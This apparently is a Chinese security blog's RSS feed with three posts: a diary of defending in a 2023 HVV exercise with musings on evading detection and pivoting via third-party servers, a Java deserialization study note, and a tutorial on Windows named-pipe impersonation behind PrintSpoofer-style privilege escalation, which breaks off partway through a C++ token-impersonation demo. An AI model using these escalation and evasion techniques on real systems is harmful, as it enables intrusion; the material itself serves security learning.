<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Hello, P001&apos;s blog!</title>
    <description> &lt;h1&gt;P001water@c:\Users\maylas\.ssh&lt;/h1&gt; &lt;h3&gt;Do Enjoy youself in hack life&lt;/h3&gt; --------CMD /c 这里是朴水... ... Reply from 1988 !-------</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Sat, 21 Oct 2023 20:45:40 +0800</pubDate>
    <lastBuildDate>Sat, 21 Oct 2023 20:45:40 +0800</lastBuildDate>
    <generator>Jekyll v4.3.2</generator>
    
      <item>
        <title>2023 Hvv漫游日记与思考</title>
        <description>&lt;blockquote&gt;
  &lt;p&gt;那些年我们护网的日子……&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;一探路&quot;&gt;一、探路&lt;/h1&gt;

&lt;p&gt;Hvv的路还是有些曲折的，很多zj在卡年龄，薪资之类的。&lt;/p&gt;

&lt;p&gt;毕竟这东西在现场，也只是少部分能干活的人干活。所以慢慢给大多数人的印象就是不需要干活。如果不需要干活，不就一定程度上说明这届红队不太行嘛。&lt;/p&gt;

&lt;p&gt;也面试了不少中介，有的中介出于卡薪资的心态，会问很多rt中高的内容，cs，操作系统原理都得给你来点儿，甚至整场面试不涉及蓝队相关的内容，最后随便问两个流量特征草草了之，这种纯纯卡人卡钱的都是**，还得是gy。不过不用被问的emo，毕竟我们和中介是双向选择，找下家就行了。&lt;/p&gt;

&lt;p&gt;说是薪资低了，实际上是他们赚的更多了。想拿高点的话就做好能干活的准备，找找学校工作的学长也可能有门路，但也可能被不当人一天发三百。还是那句话，没人脉就拿实力拿钱，没实力拿人脉换钱，又有实力又有人脉就活该你拿钱。&lt;/p&gt;

&lt;h1 id=&quot;二上路&quot;&gt;二、上路&lt;/h1&gt;

&lt;p&gt;最后还是成功上车了，360，面向某省单位。大哥说还是很轻松的，活少钱多。于是准备愉快的当猴子了。&lt;/p&gt;

&lt;p&gt;到地方了刚和销售对接上（后来才知道可能是项目经理才和销售对接）。当时我问销售：“姐，这次咱们谁主防，听谁的”，姐&lt;/p&gt;

&lt;p&gt;热络的：“这次咱们主防啊，都听你的，待会儿还会给你配几个人”。当时我噎了一下，心里直接麻了，这台本来之前可没对过啊，我tm成真身了。硬着头皮上去了。幸亏咱能扯，和信息中心的老大哥们扯东扯西能对付过去。&lt;/p&gt;

&lt;h1 id=&quot;三经历&quot;&gt;三、经历&lt;/h1&gt;

&lt;p&gt;总的下来，个人觉得打一场蓝队对未来的RT们来说还是很有必要的，当然前提是能发挥点作用的职位。如果是个应急岗，也能收获不少，毕竟哪有那么多的应急真实环境让你锻炼，可以说都是喂出来的。&lt;/p&gt;

&lt;p&gt;整场hvv下来，让我看见了一个真实环境下的极大的业务网络拓扑情况和当前肯下功夫的防守方所做的防御建设（zf单位，舍得在安全建设上花钱）。因为是主防，所以大哥很耐心的给我讲解整个的网络拓扑分配。&lt;/p&gt;

&lt;p&gt;设备情况应该各家单位大差不差：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;防火墙&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;防火墙基本都是上的硬件防火墙，策略也是白名单，流量入口出口给你限制的死死的。老大哥甚至能清楚的说出对每一块区域甚至单个主机配的策略，md他那主机策略几百条来着，因为下边单位众多，配的相对详细。据他说没优化前可能更多。手动苦笑&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;态势感知&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;各家的产品一般都是放个探针的在流量出口，一般是交换机等等上。然后数据由探针上报到态势感知分析展示。后来老大哥们甚至想统筹全省，搁下属单位都放个探索，上报流量。这样一算我还可能帮销售卖出几百万设备：）&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;上网行为管理软件&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;额，最出名的就是深信服的了，听老大哥说深信服在此深耕数十年，附带有邮件收发管理，钓鱼邮件检测。记得刚开始第一天就来了个钓鱼邮件，也是深信服的检测到的。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;防病毒软件（杀毒软件）&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;很多家也在推防勒索的之类的，其中大差不差。防病毒防勒索，很多企业和政府单位也都非常重视。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;终端管理软件（这个很硬核，个人感觉甚至应当成为未来RT对抗的主流）&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;就是现在名头响当当的EDR，印象里国内五家干这个的，安恒的、青藤云的、网思科平的天蝎、深信服的下一代、通软（被360收购了）的。说它硬核，它没有Windows域那样需要一定的功底才能实现运维管理，主机上装个软件就能实现远程管理，当然功能也没有那么全。但是它是真的狠，电脑只要一装上了，一有异常直接就登上去看异常看进程看外联、处置了。还有U盘限制，安装软件限制之类的，ring3级别的真就治的你服服帖帖的。&lt;/p&gt;

&lt;p&gt;还有重头戏就是云，现在重要单位都在一手推国产化，一手业务上云统一管理。这部分极大的减少了我们的防守压力，保住了我主防的尊严：）。&lt;/p&gt;

&lt;p&gt;基本下来，我们这战况还算清闲，都是处理内网里从下级单位来的钓鱼，通知下级单位被攻击，偶尔上机排查之类的，最后也算功德圆满。&lt;/p&gt;

&lt;p&gt;事实是我们的内网真是脆弱的像一张纸，甚至有的自主开发的系统，把sql语句直接完整写在get参数里，到底算个啥嘛&lt;/p&gt;

&lt;h1 id=&quot;四延申&quot;&gt;四、延申&lt;/h1&gt;

&lt;p&gt;总是要出去看看的，这一趟下来，最深的感受就是内网不只是域渗透，面对一个真实环境下的大型内网，更需要快速理清所进入的网络环境、怎样操作才会最小程度的引起态感设备的报警，和终端行为管理做对抗，甚至利用驻场安服的心理打对抗。当时设备告警里有很多和运营商网络，甚至360杀毒上报样本回连都会被告警成C&amp;amp;C回连，当然处置都是白名单处理了。如果拿下一台运营商网络当跳板，或者拿下流氓软件的服务器当跳板，比如解压软件，图片编辑软件的公司，效果估计也不错。&lt;/p&gt;

&lt;p&gt;当时我经常想，如果是我打，能怎么哪。就算拿下一台机子，内网刚开始信息收集，扫网段，接着就是被态感设备检测，然后就是ip被封，上机排查。怎可一个绝望了得&lt;/p&gt;

&lt;p&gt;正好在群里看见这个。第一眼看见了觉得就像是对着“我们”打的一样。可能也是当下高级红的基本要求，我等努力的方向呀。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/f4d28eaa3296c113ab837552752f812.jpg&quot; alt=&quot;f4d28eaa3296c113ab837552752f812&quot; style=&quot;zoom: 25%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;网络安全在学校走出不路来，一个人也走不出来，so，这就是后面努力的方向吧……&lt;/p&gt;

&lt;p&gt;但行好事，后问前程&lt;/p&gt;

</description>
        <pubDate>Fri, 25 Aug 2023 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/hvv/2023/08/25/Hvv%E6%BC%AB%E6%B8%B8%E6%97%A5%E8%AE%B0%E4%B8%8E%E6%80%9D%E8%80%83.html</link>
        <guid isPermaLink="true">http://localhost:4000/hvv/2023/08/25/Hvv%E6%BC%AB%E6%B8%B8%E6%97%A5%E8%AE%B0%E4%B8%8E%E6%80%9D%E8%80%83.html</guid>
        
        
        <category>hvv</category>
        
      </item>
    
      <item>
        <title>7.25 —— Hello!  Java SEC</title>
        <description>&lt;blockquote&gt;
  &lt;p&gt;这两天好像出鬼了，对于Java我好像突然顿悟了。以前死看不懂的Java代码突然理解了。架构，模式在脑子里都更清晰了，看代码终于是有头绪了。（可能是最近给我的国外研究生学生上课，蹭了他们JavaSEC Spring的课件、加上又学了遍Java SE）&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;说起来，最近都在摸.net和Java，接触下来的感觉就是这两门语言的思想和语法都十分相似。&lt;/p&gt;

&lt;p&gt;.net是为了理解内网的一些工具学的，Java则是大势所趋（Java这一套快赶上”苹果的生态“了）&lt;/p&gt;

&lt;p&gt;学习Java反序列化，我的建议是也得先重点看看&lt;strong&gt;Java的IO流&lt;/strong&gt;，这块是真的麻烦，在反序列化的理解中也挺重要。并且IO流这一块也是其他很多语言没有突出的地方，很多语言把IO流封装的很好，Java是把这块儿甩给开发者了。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;谨以此文，记录我的Java学习历程&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;CC1-7 链&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我看过很多遍了，这两天才tm真懂了。后面准备多看看链子了。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/9409#toc-0&quot;&gt;CC链 1-7 分析 - 先知社区 (aliyun.com)&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;反序列化流程分析&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我本身正是想跟一遍下面的内容，看看怎么从&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inputStream.readObject();&lt;/code&gt;到类里Override重写的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readObject()&lt;/code&gt;的&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;filename&quot;));
inputStream.readObject();
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;正好碰见panda师傅文章了，写的简单详实&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.cnpanda.net/sec/893.html&quot;&gt;序列化流程分析总结 - panda | 热爱安全的理想少年&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.cnpanda.net/sec/928.html&quot;&gt;反序列化流程分析总结 - panda | 热爱安全的理想少年&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;动态代理&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/cicada-smile/p/14942945.html&quot;&gt;Java进阶  Proxy动态代理机制详解 - 知了一笑 - 博客园 (cnblogs.com)&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;理解动态代理，先理解静态代理&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;二次反序列化&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;https://tttang.com/archive/1701/#toc_signedobject&quot;&gt;二次反序列化 看我一命通关 - 跳跳糖 (tttang.com)&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Tue, 25 Jul 2023 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2023/07/25/Hello!-Java-SEC.html</link>
        <guid isPermaLink="true">http://localhost:4000/2023/07/25/Hello!-Java-SEC.html</guid>
        
        
      </item>
    
      <item>
        <title>Windows命名管道客户端模拟和PrintSpoofer原理探究</title>
        <description>&lt;blockquote&gt;
  &lt;p&gt;文章首发于Seebug Paper &lt;a href=&quot;https://paper.seebug.org/2090/&quot;&gt;Windows 命名管道客户端模拟和 PrintSpoofer 原理探究 (seebug.org)&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;前言&quot;&gt;前言&lt;/h1&gt;

&lt;p&gt;在Windows的实际渗透中，提权方面我们最常用到的就是众多的土豆家族&lt;/p&gt;

&lt;p&gt;关于各种土豆的原理，似乎很多人印象中一直都是这样：利用COM interface的某些特性，诱骗具有System权限的帐户连接我们可控的RPC服务端进行身份验证，然后NTLM relay的过程，拿到System的权限。&lt;/p&gt;

&lt;p&gt;现实是，基于这种想法利用的potatoes在win10 1089和server 2019之后基本都已失效了，现在正火热的RoguePotato (NG)，Sweetpotato(集成了Printspoofer等)，BadPotato，GodPotato等，都是结合了命名管道客户端模拟的老技术&lt;/p&gt;

&lt;p&gt;命名管道客户端模拟（Named_Pipe_Client_Impersonation）可以说是中后期土豆家族的关键之处，由于微软官方认为从具有SeImpersonate privilege特权的Windows服务账户提升至 NT AUTHORITY/SYSTEM 权限是预期行为。所以此后的很长一段时间，基于命名管道客户端模拟的potato都能成为利器。&lt;/p&gt;

&lt;p&gt;本文就通过命名管道客户端模拟（Name_pipe_client_Impersonation）的学习，初窥正活跃的potatoes家族中的成员，探究&lt;/p&gt;

&lt;p&gt;PrintSpoofer、BadPotato、pipePotato等”当代土豆”的原理，便于实际场景中更好的选择合适的土豆。&lt;/p&gt;

&lt;h1 id=&quot;正文&quot;&gt;正文&lt;/h1&gt;

&lt;h2 id=&quot;管道&quot;&gt;管道&lt;/h2&gt;

&lt;p&gt;讲命名管道之前先来讲下管道。管道并不是什么新鲜事物，它是一项成熟的技术，可以在很多操作系统（Unix、Linux、Windows 等）中找到，其本质是是用于进程间通信的&lt;strong&gt;共享内存区域&lt;/strong&gt;，确切的说应该是&lt;strong&gt;线程&lt;/strong&gt;间的&lt;strong&gt;通信方法&lt;/strong&gt;（IPC）。&lt;/p&gt;

&lt;p&gt;在 Windows 系统中，存在两种类型的管道：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;匿名管道 (Anonymous pipes)：匿名管道是基于字符和半双工的（即单向），通常在父进程和子进程之间传输数据，只能本地使用&lt;/li&gt;
  &lt;li&gt;命名管道 (Named pipes)：命名管道则强大的多，它是面向消息和全双工（单向或双向）的，同时还允许网络通信，用于创建客户端/服务器系统。可通过名称引用；支持多客户端连接；支持双向通信；支持异步重叠 I/O&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;由于匿名管道单向通信，且只能在本地使用的特性，一般用于程序输入输出的重定向，如一些后门程序获取 cmd 内容等等，在实际攻击过程中利用不多，因此就不过多展开讨论。本文的主要内容还是命名管道Named Pipes。&lt;/p&gt;

&lt;h2 id=&quot;命名管道-names-pipes&quot;&gt;命名管道 Names Pipes&lt;/h2&gt;

&lt;p&gt;不仅仅是土豆家族的本地提权，内网横向三大件，都离不开命名管道&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;命名管道&lt;/strong&gt;是一个具有名称，可在同一台计算机的不同进程之间或在跨越一个网络的不同计算机的不同进程之间，支持&lt;strong&gt;可靠的&lt;/strong&gt;、&lt;strong&gt;单向或双向&lt;/strong&gt;的数据通信管道。命名管道的所有实例拥有&lt;strong&gt;相同的名称&lt;/strong&gt;，但是每个实例都有其自己的缓冲区和句柄，用来为不同客户端提供独立的管道。任何进程都可以访问命名管道，并接受安全权限的检查，通过命名管道使相关的或不相关的进程之间的通讯变得异常简单。&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  用命名管道来设计跨计算机应用程序实际非常简单，并不需要事先深入掌握底层网络传送协议（如TCP、UDP、IP、IPX）的知识。这是由于命名管道利用了微软网络提供者（MSNP）重定向器通过同一个网络在各进程间建立通信，这样一来，应用程序便不必关心网络协议的细节。

 任何进程都可以成为服务端和客户端双重角色，这使得点对点双向通讯成为可能。在这里，管道服务端进程指的是创建命名管道的一端，而管道客户端指的是连接到命名管道某个实例的一端。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;总结：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;命名管道的名称在本系统中是唯一的。&lt;/li&gt;
  &lt;li&gt;命名管道可以被任意符合权限要求的进程访问。&lt;/li&gt;
  &lt;li&gt;命名管道只能在本地创建。&lt;/li&gt;
  &lt;li&gt;命名管道是双向的，所以两个进程可以通过同一管道进行交互。&lt;/li&gt;
  &lt;li&gt;多个独立的管道实例可以用一个名称来命名。例如几个客户端可以使用名称相同的管道与同一个服务器进行并发通信。&lt;/li&gt;
  &lt;li&gt;命名管道的客户端可以是本地进程（本地访问：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\\.\pipe\PipeName&lt;/code&gt;）或者是远程进程（访问远程： &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\\ServerName\pipe\PipeName&lt;/code&gt;）。&lt;/li&gt;
  &lt;li&gt;命名管道使用比匿名管道灵活，服务端、客户端可以是任意进程，匿名管道一般情况下用于父子进程通讯。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;它与网络编程中的TCP套接字编程非常相似，都有服务端和客户端的概念，你可以拥有一个服务端监听连接，等待客户端连接到服务端以请求或发送数据的过程。&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;命名管道在Windows系统中被广泛使用，用MS的工具[Pipelist - Sysinternals&lt;/td&gt;
      &lt;td&gt;Microsoft Learn](https://learn.microsoft.com/en-us/sysinternals/downloads/pipelist)，可以看到本机的命名管道及其相关信息：&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230623111054734.png&quot; alt=&quot;image-20230623111054734&quot; style=&quot;zoom: 67%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;或者直接使用powershell命令&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Get-ChildItem&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\\.\pipe\&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-ChildItem&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\\.\pipe\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230623135542534.png&quot; alt=&quot;image-20230623135542534&quot; style=&quot;zoom: 67%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;或者浏览器中file协议查看管道&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;file://.//pipe//
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230715225048804.png&quot; alt=&quot;image-20230715225048804&quot; style=&quot;zoom: 67%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;命名管道的创建和操作是通过Windows API调用进行管理的。&lt;/p&gt;

&lt;p&gt;对于服务端进程，常用的函数有&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateNamedPipe()&lt;/code&gt; 创建命名管道&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ConnectNamedPipe()&lt;/code&gt; 用于等待客户端连接&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;对于客户端进程，可用的函数有&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateFile()&lt;/code&gt;  连接到一个正在等待连接的命名管道上，成功返回后，客户进程就得到了一个指向已经建立连接的命名管道实例的句柄，到这里，服务端进程的 ConnectNamedPipe() 也就完成了其建立连接的任务。&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CallNamedPipe()&lt;/code&gt; 连接到一个消息类型的管道（如果管道的实例不可用则等待），向管道写入并从管道读取数据，然后关闭管道。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我们获得了命名管道的句柄，就可以像读/写文件一样读取/写入数据。每个命名管道都由以下&lt;strong&gt;“PATH”&lt;/strong&gt;标识，命名管道的命名规范遵循通用命名规范（UNC）：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\\ServerName\pipe\PipeName
访问本机上的管道
\\.\pipe\PipeName或者\\localhost\pipe\PipeName
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我们可以使用各种语言（如C、C#和PowerShell）来操作命名管道，因为归根结底还是对Windows api的调用。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;但是，为什么我们要关心命名管道呢？&lt;/strong&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;因为它允许服务端进程对连接到它的客户端进程进行&lt;strong&gt;模拟&lt;/strong&gt;。它涉及到一个至关重要的Windows api&lt;/p&gt;

  &lt;p&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient&quot;&gt;ImpersonateNamedPipeClient()&lt;/a&gt;。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230625143246366.png&quot; alt=&quot;image-20230625143246366&quot; style=&quot;zoom:67%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;通过调用ImpersonateNamedPipeClient()，命名管道服务端可以模拟命名管道客户端的安全上下文，&lt;strong&gt;从而直接将命名管道服务端当前线程的Token令牌更改为命名管道客户端的Token令牌&lt;/strong&gt;，关键就在这。&lt;/p&gt;

&lt;p&gt;再看MSDN对它的附注，和所有模拟函数（包括ImpersonateNamedPipeClient）一样，它需要满足以下条件之一：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;令牌的请求模拟级别低于SecurityImpersonation，例如SecurityIdentification或SecurityAnonymous。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;调用者具有SeImpersonatePrivilege权限&lt;/strong&gt;。&lt;/li&gt;
  &lt;li&gt;通过LogonUser或LsaLogonUser函数，一个进程（或调用者登录会话中的另一个进程）使用明确凭据创建了令牌。&lt;/li&gt;
  &lt;li&gt;验证的身份与调用者相同。 Windows XP与SP1及更早版本：不支持SeImpersonatePrivilege权限。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;这也是中后期土豆都需要SeImpersonatePrivilege权限的原因，需要这个特权才能成功调用至关重要的ImpersonateNamedPipeClient() api函数。&lt;/p&gt;

&lt;p&gt;因此，如果我们自己创建一个恶意的命名管道服务端，并且一个具有管理员（甚至是System权限）权限的管道客户端连接到我们的管道服务端，理论上我们就可以模拟管理员用户的权限。&lt;/p&gt;

&lt;h1 id=&quot;实现命名管道客户端模拟&quot;&gt;实现命名管道客户端模拟&lt;/h1&gt;

&lt;p&gt;介绍几个会使用的Win API&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;GetCurrentProcess()  返回值是当前进程的伪句柄。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;OpenProcessToken() 打开与进程关联的访问令牌（Access Token），返回访问令牌的句柄的指针&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;DuplicateToken() or DuplicateTokenEx() 创建一个新的访问令牌，该令牌复制已存在的&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/desktop/SecGloss/a-gly&quot;&gt;访问令牌&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;CreateProcessWithTokenW()  创建新进程及其主线程。新进程在&lt;strong&gt;指定&lt;/strong&gt;令牌的安全上下文中运行。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;ImpersonateNamedPipeClient()&lt;/strong&gt; 参上详细介绍&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Demo代码实现如下&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;sddl.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ImpersonatedUser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dwCreationFlags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;dwCreationFlags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CREATE_UNICODE_ENVIRONMENT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;g_bInteractWithConsole&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TRUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;LPWSTR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwszCurrentDirectory&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;dwCreationFlags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;g_bInteractWithConsole&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CREATE_NEW_CONSOLE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;LPVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpEnvironment&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;PROCESS_INFORMATION&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;STARTUPINFO&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;si&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hSystemTokenDup&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;INVALID_HANDLE_VALUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

